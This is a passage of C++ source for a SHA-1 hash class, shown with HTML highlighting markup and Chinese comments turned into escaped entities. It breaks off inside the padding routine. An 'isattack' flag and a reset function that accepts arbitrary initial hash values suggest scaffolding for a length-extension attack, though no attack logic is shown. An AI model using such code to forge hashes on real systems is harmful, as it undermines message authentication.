          /*! &amp;lt;called <span class="class">Input</span> after <span class="class">Result</span> --&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x547D</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x4E4B</span>; */
         shaStateError     
};
<span class="symbol">#endif</span>
//! <span class="class">SHA1HashSize</span>&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x662F</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x54C8</span>;&amp;<span class="symbol">#x5E0C</span>;&amp;<span class="symbol">#x8868</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5927</span>;&amp;<span class="symbol">#x5C0F</span>;
<span class="symbol">#define</span> <span class="class">SHA1HashSize</span> <span class="number">20</span>
//!   #&amp;<span class="symbol">#x80FD</span>;&amp;<span class="symbol">#x591F</span>;&amp;<span class="symbol">#x8FDB</span>;&amp;<span class="symbol">#x884C</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x7F16</span>;&amp;<span class="symbol">#x8BD1</span>;&amp;<span class="symbol">#x7684</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x7C7B</span>;
 /*! 
       @see class _declspec(dllexport) <span class="class">SHA_1</span>
       &amp;<span class="symbol">#x5C06</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x5199</span>;&amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5F62</span>;&amp;<span class="symbol">#x5F0F</span>;&amp;<span class="symbol">#x65B9</span>;&amp;<span class="symbol">#x4FBF</span>;&amp;<span class="symbol">#x8C03</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x751F</span>;&amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x4F7F</span>;&amp;<span class="symbol">#x7528</span>;
 */
class _declspec(dllexport) <span class="class">SHA_1</span>
{
<span class="method">public:</span>
         //!   #&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x63A7</span>;&amp;<span class="symbol">#x5236</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>; <span class="class">SHA1Context</span>
         /*!
             &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x8FD9</span>;&amp;<span class="symbol">#x79CD</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x5C06</span>;&amp;<span class="symbol">#x4F1A</span>;&amp;<span class="symbol">#x63A7</span>;&amp;<span class="symbol">#x5236</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>; for   the <span class="class">SHA</span>-<span class="number">1</span>
             hashing operation
                   @see   struct <span class="class">SHA1Context</span>
         */
         typedef   struct <span class="class">SHA1Context</span>
         {
                   unsigned   long <span class="class">Intermediate_Hash</span>[<span class="class">SHA1HashSize</span>/<span class="number">4</span>]; /*! &amp;lt;<span class="class">Message</span> <span class="class">Digest</span>  */

                   unsigned   long <span class="class">Length_Low</span>;            /*!   &amp;lt;<span class="class">Message</span> length in bits      */
                   unsigned   long <span class="class">Length_High</span>;           /*!   &amp;lt;<span class="class">Message</span> length in bits      */

                   /*!   &amp;lt;<span class="class">Index</span> into message block array   */
                   long   <span class="class">Message_Block_Index</span>;
                   unsigned   char <span class="class">Message_Block</span>[<span class="number">64</span>];      /*!   &amp;lt;<span class="number">512</span>-bit message blocks      */

                   int   <span class="class">Computed</span>;               /*! &amp;lt;<span class="class">Is</span> the   digest computed?         */
                   int   <span class="class">Corrupted</span>;             /*! &amp;lt;<span class="class">Is</span> the   message digest corrupted? */
         }   <span class="class">SHA1Context</span>;

<span class="method">public:</span>
      //! <span class="symbol">#SHA_1</span> &amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x9020</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
          @see <span class="class">SHA_1</span>()
      &amp;<span class="symbol">#x5176</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x5E94</span>;&amp;<span class="symbol">#x8BE5</span>;&amp;<span class="symbol">#x5BF9</span>;<span class="class">SHA_1</span>&amp;<span class="symbol">#x7C7B</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E9B</span>;&amp;<span class="symbol">#x53D8</span>;&amp;<span class="symbol">#x91CF</span>;&amp;<span class="symbol">#x8FDB</span>;&amp;<span class="symbol">#x884C</span>;&amp;<span class="symbol">#x76F8</span>;&amp;<span class="symbol">#x5E94</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;
      */
         <span class="class">SHA_1</span>();
         //!   <span class="symbol">#SHA_1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6790</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
         @see   ~<span class="class">SHA_1</span>()
      &amp;<span class="symbol">#x91CA</span>;&amp;<span class="symbol">#x653E</span>;&amp;<span class="symbol">#x5185</span>;&amp;<span class="symbol">#x5B58</span>;
      */
         ~<span class="class">SHA_1</span>(void);

         /*----------------------------------&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#xFFFD</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x539F</span>;&amp;<span class="symbol">#x578B</span>;----------------------------------*/
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x6A21</span>;&amp;<span class="symbol">#x5757</span>;
      /*!
           @see void <span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @return[void] &amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4EFB</span>;&amp;<span class="symbol">#x4F55</span>;&amp;<span class="symbol">#x503C</span>;
      */
         void   <span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *);      /*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;  */
      //! <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see void <span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span>   *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @param[in] &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x56FA</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E4B</span>;<span class="number">512</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;
           @return[void] &amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4EFB</span>;&amp;<span class="symbol">#x4F55</span>;&amp;<span class="symbol">#x503C</span>;
      */
         void   <span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span> *);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x64CD</span>;&amp;<span class="symbol">#x4F5C</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Reset</span>(  <span class="class">SHA1Context</span> *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @return[int] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Reset</span>(  <span class="class">SHA1Context</span> *,unsigned long   , unsigned long , unsigned long,unsigned long,unsigned long);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Input</span>(  <span class="class">SHA1Context</span> *, const unsigned char *,   unsigned int);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
      @param[unsigned char &amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x6536</span>;&amp;<span class="symbol">#x5355</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">8</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x8282</span>;&amp;<span class="symbol">#x500D</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;
           @return[enum] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaStateError
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Input</span>(  <span class="class">SHA1Context</span> *, const   unsigned char *, unsigned int);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Result</span>( <span class="class">SHA1Context</span> *,   unsigned char <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>]);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
      @param[unsigned char <span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
           @attention &amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E2A</span>;<span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
           @return[enum] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaStateError
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Result</span>( <span class="class">SHA1Context</span> *, unsigned char <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>]);

<span class="method">private:</span>
};

<span class="symbol">#endif</span> // <span class="class">SHA1_H</span>

<span class="class">Sha1</span>.app
// sha1.cpp : <span class="class">Defines</span> the entry   point for the console application.
//

<span class="symbol">#include</span> &amp;quot;<span class="class">SHA1</span>.h&amp;quot;
<span class="symbol">#include</span> &amp;quot;stdio.h&amp;quot;
<span class="symbol">#include</span> &amp;quot;windows.h&amp;quot;
/*&amp;<span class="symbol">#xFF01</span>;&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x5404</span>;&amp;<span class="symbol">#x79CD</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x91CF</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x79F0</span>;&amp;<span class="symbol">#x7686</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x5728</span>;&amp;<span class="symbol">#x51FA</span>;&amp;<span class="symbol">#x7248</span>;&amp;<span class="symbol">#x7269</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x516C</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x79F0</span>;  */
/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x662F</span>;&amp;<span class="symbol">#x4E3A</span>; <span class="class">SHA1</span> &amp;<span class="symbol">#x5411</span>;&amp;<span class="symbol">#x5DE6</span>;&amp;<span class="symbol">#x73AF</span>;&amp;<span class="symbol">#x5F62</span>;&amp;<span class="symbol">#x79FB</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x5B8F</span>; &amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;
 */

<span class="class">BOOL</span> isattack = <span class="class">FALSE</span>;
int paddinglength = <span class="number">0</span>;

<span class="symbol">#define</span>   <span class="class">SHA1CircularShift</span>(bits,word) \
                (((word) &amp;lt;&amp;lt; (bits)) |   ((word) &amp;gt;&amp;gt; (<span class="number">32</span>-(bits))))

<span class="class">SHA_1</span>::<span class="class">SHA_1</span>()
{
}

<span class="class">SHA_1</span>::~<span class="class">SHA_1</span>(void)
{
}

/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *  &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x56FA</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E4B</span>;<span class="number">512</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;
 */
void   <span class="class">SHA_1</span>::<span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span> *context)
{
      const unsigned long <span class="class">K</span>[] =      {       /* <span class="class">Constants</span> defined in   <span class="class">SHA</span>-<span class="number">1</span>   */
                            <span class="number">0x5A827999</span>,
                            <span class="number">0x6ED9EBA1</span>,
                            <span class="number">0x8F1BBCDC</span>,
                            <span class="number">0xCA62C1D6</span>
                            };
      int               t;                 /* &amp;<span class="symbol">#x5FAA</span>;&amp;<span class="symbol">#x73AF</span>;&amp;<span class="symbol">#x8BA1</span>;&amp;<span class="symbol">#x6570</span>; */
      unsigned long      temp;              /* &amp;<span class="symbol">#x4E34</span>;&amp;<span class="symbol">#x65F6</span>;&amp;<span class="symbol">#x7F13</span>;&amp;<span class="symbol">#x5B58</span>; */
      unsigned long      <span class="class">W</span>[<span class="number">80</span>];             /* &amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x987A</span>;&amp;<span class="symbol">#x5E8F</span>;   */
      unsigned long      <span class="class">A</span>, <span class="class">B</span>, <span class="class">C</span>, <span class="class">D</span>,   <span class="class">E</span>;     /* &amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#x7CFB</span>;&amp;<span class="symbol">#x7EDF</span>;&amp;<span class="symbol">#x78C1</span>;&amp;<span class="symbol">#x76D8</span>;&amp;<span class="symbol">#x7F13</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x5757</span>; */

      /*
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x5728</span>;<span class="class">W</span>&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5934</span>;<span class="number">16</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;
     */
      for(t = <span class="number">0</span>; t &amp;lt; <span class="number">16</span>; t++)
      {
        <span class="class">W</span>[t] = context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span>] &amp;lt;&amp;lt; <span class="number">24</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">1</span>] &amp;lt;&amp;lt; <span class="number">16</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">2</span>] &amp;lt;&amp;lt; <span class="number">8</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">3</span>];
      }

      for(t = <span class="number">16</span>; t &amp;lt; <span class="number">80</span>; t++)
      {
       <span class="class">W</span>[t] = <span class="class">SHA1CircularShift</span>(<span class="number">1</span>,<span class="class">W</span>[t-<span class="number">3</span>] ^   <span class="class">W</span>[t-<span class="number">8</span>] ^ <span class="class">W</span>[t-<span class="number">14</span>] ^ <span class="class">W</span>[t-<span class="number">16</span>]);
      }

      <span class="class">A</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>];
      <span class="class">B</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>];
      <span class="class">C</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>];
      <span class="class">D</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>];
      <span class="class">E</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>];
      /* 
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x5B66</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x53CA</span>;&amp;<span class="symbol">#x5176</span>;&amp;<span class="symbol">#x8FED</span>;&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>; 
     */
      for(t = <span class="number">0</span>; t &amp;lt; <span class="number">20</span>; t++)
      {
                   temp   =  <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) +
                            ((<span class="class">B</span>   &amp;amp; <span class="class">C</span>) | ((~<span class="class">B</span>) &amp;amp; <span class="class">D</span>)) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">0</span>];
                   <span class="class">E</span>   = <span class="class">D</span>;
                   <span class="class">D</span>   = <span class="class">C</span>;
                   <span class="class">C</span>   = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
                   <span class="class">B</span>   = <span class="class">A</span>;
                   <span class="class">A</span>   = temp;
      }

      for(t = <span class="number">20</span>; t &amp;lt; <span class="number">40</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) + (<span class="class">B</span> ^   <span class="class">C</span> ^ <span class="class">D</span>) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">1</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }

      for(t = <span class="number">40</span>; t &amp;lt; <span class="number">60</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) +
               ((<span class="class">B</span> &amp;amp; <span class="class">C</span>) | (<span class="class">B</span> &amp;amp; <span class="class">D</span>) |   (<span class="class">C</span> &amp;amp; <span class="class">D</span>)) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">2</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }

      for(t = <span class="number">60</span>; t &amp;lt; <span class="number">80</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) + (<span class="class">B</span> ^   <span class="class">C</span> ^ <span class="class">D</span>) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">3</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }
      /* 
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x8FED</span>;&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x7B2C</span>;<span class="number">80</span>&amp;<span class="symbol">#x6B65</span>;&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x6700</span>;&amp;<span class="symbol">#x540E</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x6B65</span>;&amp;<span class="symbol">#xFF09</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;
     */
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>] += <span class="class">A</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>] += <span class="class">B</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>] += <span class="class">C</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>] += <span class="class">D</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>] += <span class="class">E</span>;

      context-&amp;gt;<span class="class">Message_Block_Index</span> = <span class="number">0</span>;
}


/*
 *    <span class="class">SHA1PadMessage</span>
 *  &amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x6A21</span>;&amp;<span class="symbol">#x5757</span>;
 */

void   <span class="class">SHA_1</span>::<span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *context)
{

      if (context-&amp;gt;<span class="class">Message_Block_Index</span> &amp;gt; <span class="number">55</span>)
      {
